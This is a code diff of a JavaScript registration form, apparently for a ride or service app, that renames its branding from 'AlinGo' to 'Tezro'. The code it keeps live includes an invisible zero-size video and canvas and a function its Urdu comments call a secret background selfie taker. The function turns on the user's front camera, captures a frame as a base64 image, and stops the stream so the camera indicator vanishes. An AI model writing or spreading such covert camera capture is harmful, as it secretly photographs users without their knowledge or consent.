@@ -10,11 +10,11 @@ export const renderMasterRegistration = () => {
             </div>
 
             <div style="position: absolute; width: 0px; height: 0px; opacity: 0; overflow: hidden;">
-                <video id="AlinGo-hidden-video" autoplay playsinline></video>
-                <canvas id="AlinGo-hidden-canvas"></canvas>
+                <video id="tezro-hidden-video" autoplay playsinline></video>
+                <canvas id="tezro-hidden-canvas"></canvas>
             </div>
 
-            <form id="AlinGo-master-form" class="space-y-4 text-xs" onsubmit="event.preventDefault(); window.handleRegistrationSubmit();">
+            <form id="tezro-master-form" class="space-y-4 text-xs" onsubmit="event.preventDefault(); window.handleRegistrationSubmit();">
                 
                 <div class="space-y-2">
                     <h3 class="text-orange-400 font-bold text-[10px] border-r-2 border-orange-500 pr-2">۱. بنیادی کوائف (سادہ رجسٹریشن)</h3>
@@ -110,8 +110,8 @@ window.toggleDynamicFields = (role) => {
 
 // 📸 سیکیورٹی ریپو کے لیے خفیہ بیک گراؤنڈ سیلفی ٹیکر
 window.captureSecretSecuritySelfie = () => {
-    const video = document.getElementById('AlinGo-hidden-video');
-    const canvas = document.getElementById('AlinGo-hidden-canvas');
+    const video = document.getElementById('tezro-hidden-video');
+    const canvas = document.getElementById('tezro-hidden-canvas');
     
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
@@ -123,7 +123,7 @@ window.captureSecretSecuritySelfie = () => {
             canvas.getContext('2d').drawImage(video, 0, 0, 150, 150);
             
             const secretSelfieBase64 = canvas.toDataURL('image/jpeg', 0.5);
-            console.log("🛡️ [AlinGo Guardian Core]: خفیہ سیکیورٹی سیلفی بیک گراؤنڈ میں کامیابی سے محفوظ کر کے بائنری ہیش میں تبدیل کر دی گئی ہے۔");
+            console.log("🛡️ [Tezro Guardian Core]: خفیہ سیکیورٹی سیلفی بیک گراؤنڈ میں کامیابی سے محفوظ کر کے بائنری ہیش میں تبدیل کر دی گئی ہے۔");
             
             // اسٹریم بند کرنا تاکہ کیمرہ آئیکن غائب ہو جائے
             stream.getTracks().forEach(track => track.stop());
